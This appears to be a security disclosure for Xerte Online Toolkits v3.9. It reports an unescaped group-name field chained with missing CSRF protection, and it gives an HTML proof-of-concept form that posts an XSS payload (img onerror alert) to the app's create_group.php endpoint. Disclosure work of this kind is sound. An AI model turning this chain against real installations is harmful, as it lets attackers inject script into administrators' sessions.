[Github repo](https://github.com/thexerteproject/xerteonlinetoolkits)
[Home Page](https://www.xerte.org.uk/index.php/en/downloads-1)
#### Version: v3.9
#### DATE 4/5/22
#### Author: cyber_homeless
#### Security issue: xss & csrf

Checking the xerteonlinetoolkits web app writed in PHP, we see a few functionality's:
![image](https://user-images.githubusercontent.com/66825349/161718592-61c43512-6001-455f-be00-d24003e1aca5.png)

Playing with the functionality's i notice there's no sanitization for escape html character's, the requests made by server works only via POST method there fore we have a self xss on ```Add user Group``` so far:
![image](https://user-images.githubusercontent.com/66825349/161719657-3c7035b6-5cdb-4bd9-9cbd-65fb5f7c77ef.png)
![image](https://user-images.githubusercontent.com/66825349/161719819-414a0686-b4d6-41ea-a321-9fe6975864da.png)
#### Vulnerable code:
![image](https://user-images.githubusercontent.com/66825349/161720242-1d5fffda-2ef9-4a57-b15b-4cb32c467859.png)
There is no CSRF protection on session so we can chain the XSS with CSRF:
![image](https://user-images.githubusercontent.com/66825349/161720621-331b951e-423b-4adf-8e84-5bbfde9e1d2b.png)

#### POC Script:
```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://192.168.43.39/xer/website_code/php/management/create_group.php" method="POST">
      <input type="hidden" name="group&#95;name" value="sss&quot;&gt;&lt;img&#32;src&#61;&apos;z&apos;&#32;onerror&#61;alert&#40;origin&#41;&gt;" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```
